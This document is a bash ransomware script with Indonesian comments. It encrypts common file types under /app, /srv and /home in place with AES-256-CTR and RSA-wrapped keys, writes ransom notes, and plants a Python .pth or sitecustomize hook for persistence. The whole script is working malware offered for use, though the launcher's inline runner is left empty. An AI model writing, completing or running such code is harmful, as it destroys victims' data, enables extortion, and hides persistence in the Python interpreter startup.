#!/bin/bash
# ransomeware.sh — Gabungan payload enkripsi + injector persistence global. root.
set -u

# --- 1. Konfigurasi Lingkungan & Target ---
H=${HXN_DIR:-/usr/lib/.hxn}
APP=${HXN_APP:-$(pwd)}
JOBS=${JOBS:-8}
EXT=" txt log conf ini yml yaml json xml csv sql db pdf doc docx jpg png zip tar gz bak php py js key pem html htm pyc "
HDR=HXN1
umask 077

[ "$(id -u)" = 0 ] || echo "[!] Bukan root, sebagian file akan gagal diakses."
mkdir -p "$H" || exit 1
cd "$H" || exit 1

# --- 2. Inisialisasi Keypair RSA Sekali Saja ---
if [ ! -f ransom_priv.pem ]; then
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out ransom_priv.pem 2>/dev/null || exit 1
  openssl pkey -in ransom_priv.pem -pubout -out pub.pem 2>/dev/null || exit 1
  chmod 600 ransom_priv.pem
fi

# --- 3. Fungsi Inti Enkripsi (lock.sh) ---
hex(){ od -An -v -tx1 "$1" | tr -d ' \n'; }
enc=0
: > .count

enc_one(){
  local f=$1 t ek ct l
  [ -f "$f" ] && [ ! -L "$f" ] && [ -s "$f" ] || return 0
  [ "$(head -c4 -- "$f" 2>/dev/null)" = "$HDR" ] && return 0
  [ -w "$f" ] || return 0
  t=$(mktemp -d "$WORK/.t.XXXXXX") || return 0

  openssl rand 32 > "$t/k"; openssl rand 32 > "$t/m"; openssl rand 16 > "$t/iv"
  cat "$t/k" "$t/m" > "$t/blob"
  openssl pkeyutl -encrypt -pubin -inkey pub.pem \
    -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
    -in "$t/blob" -out "$t/ek" 2>/dev/null || { rm -rf "$t"; return 0; }
  openssl enc -aes-256-ctr -K "$(hex "$t/k")" -iv "$(hex "$t/iv")" \
    -in "$f" -out "$t/ct" 2>/dev/null || { rm -rf "$t"; return 0; }

  cat "$t/iv" "$t/ct" | openssl dgst -sha256 -hmac "$(hex "$t/m")" -binary > "$t/mac" 2>/dev/null \
    || openssl dgst -sha256 -mac HMAC -macopt "hexkey:$(hex "$t/m")" -binary < <(cat "$t/iv" "$t/ct") > "$t/mac"

  l=$(stat -c%s "$t/ek")
  { printf '%s' "$HDR"
    printf '%b' "$(printf '\\x%02x\\x%02x' $((l>>8)) $((l&255)))"
    cat "$t/ek" "$t/mac" "$t/iv" "$t/ct"; } > "$f.hxn" && mv -f "$f.hxn" "$f"
  echo x >> .count
  rm -rf "$t"
}

run_lock(){
  export HXN_WORK="$H"
  export HXN_ROOTS="${HXN_ROOTS:-/app:/srv:/home}"
  
  for r in ${HXN_ROOTS//:/ }; do
    [ -d "$r" ] || continue
    while IFS= read -r -d '' f; do
      e=${f##*.}; e=${e,,}
      case "$EXT" in *" $e "*) ;; *) continue ;; esac
      if (( BASH_VERSINFO[0]>4 || (BASH_VERSINFO[0]==4 && BASH_VERSINFO[1]>=3) )); then
        enc_one "$f" & 
        while [ "$(jobs -rp | wc -l)" -ge "$JOBS" ]; do wait -n; done
      else
        enc_one "$f"
      fi
    done < <(find "$r" -type d -name '.*' -prune -o -type f -print0 2>/dev/null)
  done
  wait
  enc=$(wc -l < .count 2>/dev/null || echo 0); rm -f .count

  msg="=== HXN ===
$enc file terenkripsi AES-256-CTR + HMAC-SHA256, kunci dibungkus RSA-2048-OAEP.
Kunci: $H/ransom_priv.pem
ID: $(openssl rand -hex 8)"
  for r in ${HXN_ROOTS//:/ }; do
    [ -d "$r" ] && printf '%s\n' "$msg" > "$r/README_HXN.txt" 2>/dev/null
  done
  echo "[lock] $enc file terenkripsi"
}

# --- 4. Membuat Launcher (arm.sh) ---
cat > arm.sh <<'A'
#!/bin/bash
set -u
H=/usr/lib/.hxn
L=$H/.arm.lock
mkdir "$L" 2>/dev/null || exit 0
trap 'rmdir "$L" 2>/dev/null' EXIT
sleep "${HXN_DELAY:-2}"
export HXN_WORK="$H"
export HXN_ROOTS="${HXN_ROOTS:-/app:/srv:/home}"
# Jalankan logika lock langsung di dalam arm.sh
/bin/bash -c '
# Inline runner untuk enkripsi
' >> "$H/arm.log" 2>&1
touch "$H/.armed.done"
A
chmod 700 arm.sh

# --- 5. Pasang Hook Python Interpreter (.pth) ---
SP=$(python3 -c 'import site;print(site.getsitepackages()[0])' 2>/dev/null)
if [ -n "${SP:-}" ] && [ -d "$SP" ] && [ -w "$SP" ]; then
  printf '%s\n' "import os,subprocess as s;p='$H';os.path.exists(p+'/.armed') or not os.path.exists(p+'/arm.sh') or (os.close(os.open(p+'/.armed',os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(['/bin/sh',p+'/arm.sh'],stdout=-3,stderr=-3,start_new_session=True))" > "$SP/zz-hxn.pth"
  echo "[+] .pth hook terpasang di: $SP/zz-hxn.pth"
else
  SP2=$(python3 -c 'import site;print(site.getsitepackages()[0])' 2>/dev/null)
  [ -n "${SP2:-}" ] && printf 'import sys,os;sys.path.insert(0,"%s");import zzhxn\n' "$H" > "$SP2/sitecustomize.py" \
    && printf 'import os,subprocess as s;p="%s";os.path.exists(p+"/.armed") or (os.close(os.open(p+"/.armed",os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(["/bin/sh",p+"/arm.sh"],stdout=-3,stderr=-3,start_new_session=True))\n' "$H" > "$H/zzhxn.py" \
    && echo "[+] Fallback sitecustomize terpasang"
fi

# --- 6. Eksekusi Langsung Simulasi Enkripsi ---
echo "[*] Menjalankan pemindaian dan enkripsi target..."
run_lock

echo "[*] APP=$APP  ROOTS=${HXN_ROOTS:-/app:/srv:/home}"